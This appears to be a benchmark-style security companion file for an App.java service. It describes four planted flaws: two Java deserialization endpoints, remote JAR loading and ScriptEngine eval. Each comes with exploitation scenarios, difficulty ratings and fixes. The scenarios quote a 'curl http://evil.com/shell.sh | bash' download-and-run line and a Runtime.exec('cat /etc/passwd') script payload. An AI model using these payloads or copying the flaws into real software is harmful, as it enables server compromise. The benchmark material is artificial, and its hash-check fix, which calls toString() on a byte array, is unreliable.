# Security Companion Document: App.java

## Vulnerability: Unsafe Java Deserialization of Pipeline Import

**CWE:** CWE-502
**OWASP:** A08
**Complexity Level:** Obvious
**Detection Difficulty:** Easily_Detectable
**Affected Lines:** L163-L164

### Description
The `/api/pipelines/import` endpoint decodes a base64 payload and deserializes it using `ObjectInputStream.readObject()`. Java's native deserialization can instantiate arbitrary classes present on the classpath, enabling remote code execution through gadget chains (e.g., Apache Commons Collections, Spring framework classes).

### Exploitation Scenario
An attacker crafts a serialized Java object using ysoserial with a gadget chain targeting a library on the classpath (e.g., `CommonsCollections6`). They base64-encode the payload and send it to `/api/pipelines/import`. When `readObject()` is called, the gadget chain executes, running arbitrary commands on the server.

### Remediation Guidance
Replace Java native deserialization with JSON parsing:
```java
ObjectMapper mapper = new ObjectMapper();
Map<String, Object> pipelineData = mapper.readValue(decoded, new TypeReference<>() {});
```
If native deserialization is required, use an `ObjectInputFilter`:
```java
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decoded));
ois.setObjectInputFilter(info -> {
    if (info.serialClass() != null && !info.serialClass().getName().startsWith("java.util.")) {
        return ObjectInputFilter.Status.REJECTED;
    }
    return ObjectInputFilter.Status.ALLOWED;
});
```

### Complexity Rationale
This is rated Obvious because `ObjectInputStream.readObject()` on user-supplied data is a well-documented Java deserialization vulnerability pattern that any security-aware reviewer will immediately recognize.

### Detection Difficulty Rationale
This is rated Easily_Detectable because SAST tools can match `ObjectInputStream` construction with taint analysis tracing the input from the request body through `Base64.getDecoder().decode()`.

---

## Vulnerability: Unsafe Java Deserialization in Object Store Retrieval

**CWE:** CWE-502
**OWASP:** A08
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L222-L223

### Description
The `/api/objects/{key}` endpoint retrieves raw bytes from the object store and deserializes them using `ObjectInputStream.readObject()`. The object store accepts arbitrary base64-encoded data via the `/api/objects/store` endpoint without validation, allowing an attacker to store a malicious serialized object and trigger code execution when it is retrieved.

### Exploitation Scenario
An attacker stores a crafted serialized Java object (generated with ysoserial) via `/api/objects/store` using a known key. When any authenticated user retrieves that key via `/api/objects/{key}`, the `readObject()` call triggers the gadget chain, executing arbitrary code on the server.

### Remediation Guidance
Store and retrieve data as JSON instead of serialized Java objects:
```java
ObjectMapper mapper = new ObjectMapper();
String json = new String(data, StandardCharsets.UTF_8);
Object obj = mapper.readValue(json, Object.class);
```

### Complexity Rationale
This is rated Moderate because the vulnerability is split across two endpoints (store and retrieve). A reviewer must trace the data flow from the store endpoint, which accepts raw base64 bytes without validation, to the retrieve endpoint where deserialization occurs.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need to perform interprocedural analysis across two separate request handlers and recognize that the stored bytes are attacker-controlled even though they pass through an intermediate data store.

---

## Vulnerability: Remote JAR Loading via URLClassLoader

**CWE:** CWE-829
**OWASP:** A08
**Complexity Level:** Nuanced
**Detection Difficulty:** Likely_Missed
**Affected Lines:** L255-L259

### Description
The `/api/extensions/load` endpoint creates a `URLClassLoader` with a user-supplied JAR URL, loads a class by name, and instantiates it via reflection. This allows an attacker to load and execute arbitrary Java code from any remote server. The class constructor and any static initializers run immediately upon instantiation.

### Exploitation Scenario
An attacker with engineer or admin credentials hosts a malicious JAR file containing a class whose constructor executes `Runtime.getRuntime().exec("curl http://evil.com/shell.sh | bash")`. They send a request with `jar_url` pointing to their server and `class_name` set to the malicious class. The server downloads the JAR, loads the class, and executes the constructor.

### Remediation Guidance
Use a trusted extension registry with integrity verification:
```java
Map<String, String> TRUSTED_JARS = Map.of(
    "analytics", "sha256:abc123...",
    "reporting", "sha256:def456..."
);

// Verify JAR hash before loading
byte[] jarBytes = new URL(jarUrl).openStream().readAllBytes();
String actualHash = MessageDigest.getInstance("SHA-256")
    .digest(jarBytes).toString();
if (!TRUSTED_JARS.get(name).equals("sha256:" + actualHash)) {
    throw new SecurityException("Integrity check failed");
}
```

### Complexity Rationale
This is rated Nuanced because the vulnerability uses `URLClassLoader` and reflection rather than obvious deserialization APIs. A reviewer must understand that loading a class from a remote URL and instantiating it constitutes arbitrary code execution, and the endpoint is behind role-based access control which may reduce perceived risk.

### Detection Difficulty Rationale
This is rated Likely_Missed because SAST tools would need to recognize that `URLClassLoader` with a user-controlled URL combined with `loadClass` and `newInstance` constitutes remote code loading. Most tools focus on `ObjectInputStream` patterns and may not flag class loading from untrusted URLs.

---

## Vulnerability: Script Engine Evaluation of User-Supplied Code

**CWE:** CWE-829
**OWASP:** A08
**Complexity Level:** Moderate
**Detection Difficulty:** Pattern_Dependent
**Affected Lines:** L286-L293

### Description
The `/api/transform` endpoint accepts a user-supplied script string and evaluates it using Java's `ScriptEngine.eval()`. The Nashorn (or alternative JS) script engine can access Java classes and execute arbitrary Java code through JavaScript, enabling full server compromise.

### Exploitation Scenario
An attacker sends a script like `var Runtime = Java.type('java.lang.Runtime'); Runtime.getRuntime().exec('cat /etc/passwd')` to the transform endpoint. The script engine evaluates it, executing the system command and returning sensitive data.

### Remediation Guidance
Never evaluate user-supplied scripts. Use a sandboxed expression evaluator or predefined transformation functions:
```java
Map<String, Function<String, String>> transforms = Map.of(
    "uppercase", String::toUpperCase,
    "lowercase", String::toLowerCase,
    "trim", String::trim
);
Function<String, String> fn = transforms.get(body.get("transform"));
if (fn == null) return ResponseEntity.badRequest().body(Map.of("error", "Unknown transform"));
String result = fn.apply(input);
```

### Complexity Rationale
This is rated Moderate because `ScriptEngine.eval()` is a known dangerous API, but the endpoint frames it as a "data transformation" feature which may lead a reviewer to underestimate the risk. The script engine's ability to access Java classes is not immediately obvious from the API surface.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools with Java-specific rules can flag `ScriptEngine.eval()` with user-controlled input, but tools need to trace the script parameter from the request body to the eval call and understand the security implications of script engine access to Java classes.
